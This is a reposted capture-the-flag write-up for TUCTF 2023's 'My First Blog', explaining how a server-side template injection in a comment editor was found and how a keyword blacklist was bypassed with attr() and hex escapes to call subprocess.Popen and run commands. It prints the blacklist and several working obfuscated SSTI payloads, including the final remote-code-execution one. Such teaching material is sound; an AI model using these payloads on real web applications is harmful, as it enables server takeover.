# :globe_with_meridians: CTF write-up | My First Blog | TUCTF 2023 | SSTI sandbox bypass

> **Original Source:** [CTF write-up | My First Blog | TUCTF 2023 | SSTI sandbox bypass](https://me-ankeet.medium.com/ctf-write-up-my-first-blog-tuctf-2023-ssti-sandbox-bypass-ee64b84c7104)
> **Platform:** me-ankeet.medium.com | **Category:** `WEB` | **Year:** 2023

---

# CTF write-up | My First Blog | TUCTF 2023 | SSTI sandbox bypass


Today, I will be doing a walk-through of the CTF challenge titled My First Blog in TUCTF 2023. The challenge was regarding exploiting a SSTI vulnerability and leverage it to obtain RCE in the remote web server.


I have tried to make this write-up as detailed as possible curated for beginners in CTFs. If there is still something I could not clarify, do leave a comment. I will be happy to help :)


The challenge involved posting some comments with a functionality of editing them. So, I started with trying out some XSS payloads first but that didn’t work. Next, as a common CTF practice, I tried out the well known SSTI payload {{7*7}}. It looked something like this.


*That’s {{7*7}} in both Title and Content*


On submitting you get this…


Hmm… Not quite the classic 49, huh? But wait, let’s try to edit and in there let’s delete the comment.


So I click on the Delete Post button and BOOM!


We get the sweet 49 this time. So, this confirms that the site is indeed vulnerable to Server Side Template Injection (SSTI). So, now my aim would be to execute some arbitrary command on the server to read the flag. So, first I tried to come up with this simple payload…


```
{{().__class__}}
```


But then, I was returned this…


Okay, so there is some blacklisting too! The blacklist we have is:


[‘.*config.*’, ‘.*class.*’, ‘.*request.*’, ‘.*self.*’, ‘.*global.*’, ‘.*getitem.*’, ‘.*base.*’, ‘.*os.*’, ‘.*mro.*’, ‘.*import.*’, ‘.*builtins.*’, ‘.*popen.*’, ‘.*read.*’, ‘.*write.*’, ‘.*system.*’, ‘.*eval.*’, ‘.*exec.*’, ‘.*\\+.*’, ‘.*\\..*’, ‘.*\\[.*’, ‘.*\\].*’, ‘.*\\_.*’]


.* is the wildcard implying that any occurence of these anywhere in the payload will not be accepted.


So, now I went looking for answers in the docs. And I got a really useful function… attr()


The way attr() works is say I am to write


```
().__class__
```


This will be same as writing


```
()|attr('__class__')
```


So, what is the point of writing things in such a fancy way? Well as you can see __class__ is now within a string, so now we can bypass this (and any function in our blacklist). For, bypassing the above payload, we would simply do this…


```
()|attr('\x5f\x5f\x63lass\x5f\x5f')
```


‘\x5f’=’_’ and ‘\x63’=’c’


We can also chain the objects like this


```
()|attr('__class__')|attr('__base__')
```


This would correspond to


```
().__class__.__base__
```


So now things are pretty simple. We can first write the simple unmodified payload and then obfuscate it finally for testing purpose. So I now aimed to get this payload injected…


```
{{().__class__.__base__.__subclasses__()[<index for subprocess.Popen>]('whoami',shell=True,stdout=-1).communicate()}}
```


But we have two issues here:


- ‘[]’ is blacklisted

- We do not know what is the index of subprocess.Popen in the __subclass__() list


The workaround for the first part is rather simple. In python, whenever you are accessing an element of a list, say like this…


```
myArr[i]
```


you are actually making use of something called __getitem__ in python. the above code would look like this when we use getitem…


```
myArr.__getitem__(i)
```


Cool, so we can modify our above payload to this…


```
{{().__class__.__base__.__subclasses__().__getitem__(<index for subprocess.Popen>)('whoami',shell=True,stdout=-1).communicate()}}
```


Now to the next problem, index of subprocess.Popen in __subclass__(). Normally using this payload


```
().__class__.__base__.__subclasses__()
```


Which should return the entire subclass list. So our payload for testing would be


```
{{()|attr('\x5f\x5f\x63lass\x5f\x5f')|attr('\x5f\x5f\x62ase\x5f\x5f')|attr('\x5f\x5fsub\x63lasses\x5f\x5f')()}}
```


But, the payload returns this


Hmmm… That’s strange. Normally, instead of all these commas, I would actually have the elements of __subclass__() list. Something like this…


```
[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>... and so on
```


Okay, so anything enclosed within ‘<>’ will be rendered to null! So the workaround to that would be to add a .replace(‘<’,’’). Like this…


```
{{()|attr('\x5f\x5f\x63lass\x5f\x5f')|attr('\x5f\x5f\x62ase\x5f\x5f')|attr('\x5f\x5fsub\x63lasses\x5f\x5f')()|attr('\x5f\x5frepr\x5f\x5f')()|attr('replace')('<','')}}
```


And BOOM! This returns…


Now we have the entire list. With some string manipulation and a python code to bruteforce for subprocess.Popen will give you the index of subprocess.Popen to be 372. So now we have our final payload…


```
{{().__class__.__base__.__subclasses__().__getitem__(372)('whoami',shell=True,stdout=-1).communicate()}}
```


Oops, I mean…


```
{{()|attr('\x5f\x5f\x63lass\x5f\x5f')|attr('\x5f\x5f\x62ase\x5f\x5f')|attr('\x5f\x5fsub\x63lasses\x5f\x5f')()|attr('\x5f\x5f\x67etitem\x5f\x5f')(372)('whoami',shell=True,stdout=-1)|attr('communicate')()}}
```


And we get the flag…


flag: TUCTF{BL4ckL1st$_R34lly_$uck}


well it seems they return the flag if you are simply able to execute any command I tried with ‘ls’ after ‘whoami’ and it too returned the flag. Anyways we got the flag, and that’s what matters :)


Happy Hacking! Signing off.

---

*Originally published on [Medium](https://me-ankeet.medium.com/ctf-write-up-my-first-blog-tuctf-2023-ssti-sandbox-bypass-ee64b84c7104). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
